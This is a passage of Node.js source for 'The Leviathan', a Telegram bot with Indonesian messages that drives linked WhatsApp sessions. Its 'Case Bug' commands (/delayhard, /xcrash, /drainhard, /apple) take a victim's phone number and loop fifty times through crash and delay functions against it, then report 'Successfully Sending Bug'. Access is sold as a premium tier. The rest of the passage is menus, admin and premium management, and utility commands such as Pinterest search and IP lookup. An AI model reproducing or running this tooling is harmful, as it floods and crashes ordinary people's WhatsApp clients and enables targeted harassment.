ᝰ.ᐟ /speed - mengukur respon bot 
ᝰ.ᐟ /cuaca - kota
ᝰ.ᐟ /getcode 
ᝰ.ᐟ /uptime - berapa lama bot aktif
ᝰ.ᐟ /pair - cek pasangan hari ini
ᝰ.ᐟ /setrules - buat aturan gb
ᝰ.ᐟ /rules - cek aturan gb
ᝰ.ᐟ /tagadmin - tagall admin
ᝰ.ᐟ /admins - cek berapa admin
ᝰ.ᐟ /groupinfo - info group 
ᝰ.ᐟ /restartbot - restart panel

<blockquote>༑ᐧ 𖣂 𝐓𝐡𝐞 ☇ 𝐋𝐞𝐯𝐢𝐚𝐭𝐡𝐚𝐧 𖣂 ༑ᐧ</blockquote>
      `;
      newButtons = [
  [
    { text: "ɴᴇxᴛ ᴛᴏᴏʟs", callback_data: "toolsv2" }
  ],
  [
    { text: "ʙᴀᴄᴋ", callback_data: "mainmenu" }
  ]
];    
   } else if (data === "toolsv2") {
      newCaption = `
<blockquote>「 𝐓𝐨𝐨𝐥𝐬 - 𝐌𝐞𝐧𝐮 ⚘ 」</blockquote>
ᝰ.ᐟ /shortlink - memperpendek link
ᝰ.ᐟ /negarainfo - info negara 
ᝰ.ᐟ /sticker - ubah foto jadi sticker 
ᝰ.ᐟ /beritaindo - berita indo hari ini
ᝰ.ᐟ /logo - membuat logo dari teks
ᝰ.ᐟ /pantun - lucu,cinta,bijak
ᝰ.ᐟ /trending - berita teratas hari ini 
ᝰ.ᐟ /katahariini - kata-kata hari ini
ᝰ.ᐟ /motivasi
ᝰ.ᐟ /hariini - tanggal,jam
ᝰ.ᐟ /faktaunik - fakta unik
ᝰ.ᐟ /dunia - berita dunia 
ᝰ.ᐟ /gempa - cek gempa hari ini
ᝰ.ᐟ /tonaked
ᝰ.ᐟ /song - mencari lagu spotify
ᝰ.ᐟ /play - memutar lagu spotify
ᝰ.ᐟ /chatowner
ᝰ.ᐟ /fixcode
ᝰ.ᐟ /ocr - ambil text yg ad di foto
ᝰ.ᐟ /gpt 
ᝰ.ᐟ /trackip
ᝰ.ᐟ /pinterest 

<blockquote>༑ᐧ 𖣂 𝐓𝐡𝐞 ☇ 𝐋𝐞𝐯𝐢𝐚𝐭𝐡𝐚𝐧 𖣂 ༑ᐧ</blockquote>
      `;
      newButtons = [
        [{ text: "ʙᴀᴄᴋ", callback_data: "tools" }]
      ];
    } else if (data === "thanksto") {
      newCaption = `
<blockquote>「 𝐓𝐡𝐚𝐧𝐤𝐬 - 𝐓𝐨𝐨 ⚘ 」</blockquote>
⚚ Allah Swt (My God) 
⚚ My Ortu (Big Support) 
⚚ @k4ezue (Author) 
⚚ All Pengguna Script

<blockquote>༑ᐧ 𖣂 𝐓𝐡𝐞 ☇ 𝐋𝐞𝐯𝐢𝐚𝐭𝐡𝐚𝐧 𖣂 ༑ᐧ</blockquote>
      `;
      newButtons = [
        [{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu" }]
      ];
    } else if (data === "mainmenu") {
      newCaption = `
<blockquote>｢ The - Leviathan ｣</blockquote>
─ WhatsAppボットは、迅速で安全な自動化パートナー。あなたのデジタルライフを支援します。

<blockquote><b>「   Leviathan ☇ System ⸸  」</b></blockquote>
ᯤ Author : @k4ezue
ᯤ Prefix : / (slash)
ᯤ Version : 1.0
ᯤ Status Core : ${sessions.size} Active 
ᯤ Libary : Node-Telegram-Api
ᯤ Type : ( Plugin )

<blockquote>( ! ) sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ</blockquote>
      `;
      newButtons = [
        [
          { text: "｢⚙️｣ ☇ OPTIONS", callback_data: "ownermenu" },
          { text: "｢🛠｣ ☇ TOOLS", callback_data: "tools" }
        ],
        [
          { text: "｢🦠｣ ☇ BUG MENU", callback_data: "bugshow" }
        ],
        [
          { text: "｢👥｣ ☇ THANKS TO", callback_data: "thanksto" },
        ]
      ];
    } else {
      return bot.answerCallbackQuery(callbackQuery.id, { text: "Refresh", show_alert: false });
    }

    await bot.editMessageMedia({
      type: "photo",
      media: randomImage,
      caption: newCaption,
      parse_mode: "HTML"
    }, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: { inline_keyboard: newButtons }
    });

    bot.answerCallbackQuery(callbackQuery.id);
  } catch (err) {
    console.error("Gagal edit media:", err);
    bot.answerCallbackQuery(callbackQuery.id, { text: "Error terjadi", show_alert: false });
  }
}); // <-- Penutup yang benar

/// --- ( Parameter ) --- \\\
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/// --- ( Case Bug ) --- \\\
bot.onText(/\/delayhard (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
// --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendPhoto(chatId, getRandomImage(), {
    caption: `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}  
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/k4ezue" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /ᯤ terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : delayhard
𖥂 Status : Process
𖥂 Date now : ${date}

© leviathan  𖣂
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : delayhard
𖥂 Status : Process
𖥂 Date now : ${date}

© leviathan  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 50; i++) {
      await locationX(target);
      await sleep(300);
      await amelDelayy(sock, target, true)
      await sleep(300);
      await amelaDeley(sock, target, mention = true)
      await sleep(300)
      await locationX(target);
      await QlayInvisible(sock, target);
      await locationX(target);
      await sleep(300);
      await amelDelayy(sock, target, true)
      await sleep(300);
      await amelaDeley(sock, target, mention = true )
      await sleep(300);
      await Abcd(sock, target, true);
      await sleep(300);
      await Delayamel(sock, target, true)
      await sleep(300);
      await DelayMsg(target, ptcp = true);
      await TimerXDelay(target);
      await sleep(300);
      await CrashingX(sock, target, false);
      await sleep(300);   
    } 

    console.log(chalk.red(`𖣂 The  ⵢ Leviathan 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : delayhard
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© leviathan  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/xcrash (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
// --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendPhoto(chatId, getRandomImage(), {
    caption: `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}  
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/k4ezue" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /ᯤ terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : xcrash
𖥂 Status : Process
𖥂 Date now : ${date}

© leviathan  𖣂
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : xcrash
𖥂 Status : Process
𖥂 Date now : ${date}

© leviathan  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 50; i++) {
      await betadelayNew(sock, target);
      await LalahMaklu(sock, target);
    }

    console.log(chalk.red(`𖣂 The  ⵢ Leviathan 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : xcrash
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© leviathan  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/drainhard (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
// --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendPhoto(chatId, getRandomImage(), {
    caption: `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}  
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/k4ezue" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /ᯤ terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : drainhard
𖥂 Status : Process
𖥂 Date now : ${date}

© leviathan  𖣂
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : drainhard
𖥂 Status : Process
𖥂 Date now : ${date}

© leviathan  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 50; i++) {
      await betadelayNew(sock, target);
      await LalahMaklu(sock, target);
    }

    console.log(chalk.red(`𖣂 The  ⵢ Leviathan 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : drainhard
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© leviathan  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/apple (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
// --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendPhoto(chatId, getRandomImage(), {
    caption: `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}  
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/k4ezue" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /ᯤ terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : apple
𖥂 Status : Process
𖥂 Date now : ${date}

© leviathan  𖣂
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : apple
𖥂 Status : Process
𖥂 Date now : ${date}

© leviathan  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 50; i++) {
      await betadelayNew(sock, target);
      await LalahMaklu(sock, target);
    }

    console.log(chalk.red(`𖣂 The  ⵢ Leviathan 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug :apple
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© leviathan  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

/// --------- ( Plungi ) --------- \\\

/// --- ( case add bot ) --- \\\
bot.onText(/^\/connect\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botNumber = match[1].replace(/[^0-9]/g, ""); 

  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Hanya *Owner/Admin* yang dapat menjalankan perintah ini.
`, { parse_mode: "Markdown" });
  }

  if (!botNumber || botNumber.length < 8) {
    return bot.sendMessage(chatId, `
⚠️ Nomor tidak valid.
Gunakan format: \`/connect 628xxxxxx\`
`, { parse_mode: "Markdown" });
  }

  try {
    await bot.sendMessage(chatId, `
🔄 Sedang menghubungkan *${botNumber}@s.whatsapp.net* ke sistem...
Mohon tunggu sebentar.
`, { parse_mode: "Markdown" });

    await connectToWhatsApp(botNumber, chatId);

    await bot.sendMessage(chatId, `
✅ *Berhasil terhubung!*
Bot WhatsApp aktif dengan nomor: *${botNumber}*
`, { parse_mode: "Markdown" });

  } catch (error) {
    console.error("❌ Error in /connect:", error);
    bot.sendMessage(chatId, `
❌ Gagal menghubungkan ke WhatsApp.
> ${error.message || "Silakan coba lagi nanti."}
`, { parse_mode: "Markdown" });
  }
});
           
/// --- ( case group only ) --- \\\     
bot.onText(/^\/gruponly\s+(on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const mode = match[1].toLowerCase();
  const status = mode === "on";

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Perintah ini hanya bisa digunakan oleh *Owner/Admin*.`, { parse_mode: "Markdown" });
  }

  try {
    const data = { groupOnly: status };
    fs.writeFileSync(ONLY_FILE, JSON.stringify(data, null, 2));

    bot.sendMessage(chatId, `
⚙️ *Mode Group Only* berhasil diperbarui!
Status: *${status ? "AKTIF ✅" : "NONAKTIF ❌"}*
`, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("Gagal menyimpan status Group Only:", err);
    bot.sendMessage(chatId, `
❌ Terjadi kesalahan saat menyimpan konfigurasi.
${err.message}
`, { parse_mode: "Markdown" });
  }
});

/// --- ( case add acces premium ) --- \\\
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
( ⚠️ ) *Akses Ditolak!*
Anda tidak memiliki izin untuk menjalankan perintah ini.`, { parse_mode: "Markdown" });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format berikut:
✅ /addprem <code>6843967527 30d</code>
`, { parse_mode: "HTML" });
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
    return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format:
✅ /addprem <code>6843967527 30d</code>
`, { parse_mode: "HTML" });
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1].toLowerCase();

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
( ❌ ) *ID Tidak Valid!*
Gunakan hanya angka ID Telegram.
✅ Contoh: /addprem 6843967527 30d
`, { parse_mode: "Markdown" });
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(chatId, `
( ❌ ) *Durasi Tidak Valid!*
Gunakan format seperti: 30d, 12h, atau 15m.
✅ Contoh: /addprem 6843967527 30d
`, { parse_mode: "Markdown" });
  }

  const timeValue = parseInt(duration);
  const timeUnit = duration.endsWith("d") ? "days" :
                   duration.endsWith("h") ? "hours" : "minutes";
  const expirationDate = moment().add(timeValue, timeUnit);

  const existingUser = premiumUsers.find(u => u.id === userId);
  if (existingUser) {
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ *User sudah premium!*
Waktu diperpanjang sampai:
🕓 ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
  } else {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ *Berhasil menambahkan user premium!*
👤 ID: ${userId}
⏰ Berlaku hingga: ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
  }

  console.log(`[PREMIUM] ${senderId} menambahkan ${userId} sampai ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
});

/// --- ( case list acces premium ) --- \\\
bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;

     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "\n";
      message += " ( + )  LIST PREMIUM USERS\n";
      message += "\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
      });
      message += "\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// --- ( case add admin ) ---
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addadmin 58273654 30d
`);
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addadmin 58273654 30d
`);
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `
✅ Berhasil menambahkan admin!
Kini user ${userId} memiliki akses admin.
`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} sudah menjadi admin.`);
  }
});


// --- ( case delete acces premium ) ---
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner/admin yang dapat melakukan command ini.`);
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /delprem 584726249`);
  }

  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Invalid input. User ID harus berupa angka.");
  }

  const index = premiumUsers.findIndex(user => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di list premium.`);
  }

  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium.`);
});


// --- ( case delete acces admin ) ---
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /deladmin 5843967527`);
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /deladmin 5843967527`);
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} belum memiliki akses admin.`);
  }
});


// --- ( Case Tools Menu ) --- \\
bot.onText(/^\/pinterest$/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(
    chatId,
    "Gunakan perintah:\n`/pinterest <kata kunci>`\n\nContoh:\n`/pinterest aesthetic girl`",
    { parse_mode: "Markdown" }
  );
});

// Command utama
bot.onText(/\/pinterest (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  try {
    await bot.sendMessage(chatId, `🔍 Mencari gambar Pinterest untuk *${query}* ...`, { parse_mode: "Markdown" });

    // ✅ Gunakan parameter q
    const apiUrl = `https://api-faa.my.id/faa/pinterest?q=${encodeURIComponent(query)}`;
    const response = await axios.get(apiUrl);

    const results = response.data.result || response.data.data;
    if (!results || results.length === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ditemukan hasil untuk kata kunci tersebut.");
    }

    // Ambil satu gambar acak
    const randomImage = results[Math.floor(Math.random() * results.length)];

    await bot.sendPhoto(chatId, randomImage, {
      caption: `✨ Hasil pencarian Pinterest untuk *${query}*`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔄 Refresh", callback_data: `refresh_${query}` }]
        ]
      }
    });

  } catch (error) {
    console.error("Terjadi error:", error.message);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mengambil data dari API.");
  }
});

// Handler tombol Refresh
bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;

  if (data.startsWith("refresh_")) {
    const query = data.replace("refresh_", "");

    try {
      const apiUrl = `https://api-faa.my.id/faa/pinterest?q=${encodeURIComponent(query)}`;
      const response = await axios.get(apiUrl);

      const results = response.data.result || response.data.data;
      if (!results || results.length === 0) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: "❌ Tidak ada hasil baru." });
      }

      const randomImage = results[Math.floor(Math.random() * results.length)];

      await bot.editMessageMedia(
        {
          type: "photo",
          media: randomImage,
          caption: `✨ (Refreshed) Pinterest untuk *${query}*`,
          parse_mode: "Markdown"
        },
        {
          chat_id: chatId,
          message_id: callbackQuery.message.message_id,
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔄 Refresh", callback_data: `refresh_${query}` }]
            ]
          }
        }
      );

      await bot.answerCallbackQuery(callbackQuery.id, { text: "✅ Diperbarui!" });
    } catch (err) {
      console.error("Gagal refresh:", err.message);
      bot.answerCallbackQuery(callbackQuery.id, { text: "⚠️ Gagal memuat gambar baru." });
    }
  }
});

module.exports = bot;

bot.onText(/^\/trackip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = (match[1] || "").trim();

  if (!ip) return bot.sendMessage(chatId, "⚠️ Contoh:\n/trackip 8.8.8.8");

  bot.sendMessage(chatId, "🛰 Sedang melacak IP...");

  try {
    const { data } = await axios.get(`http://ip-api.com/json/${ip}`);
    if (data.status !== "success") throw new Error("IP tidak ditemukan");

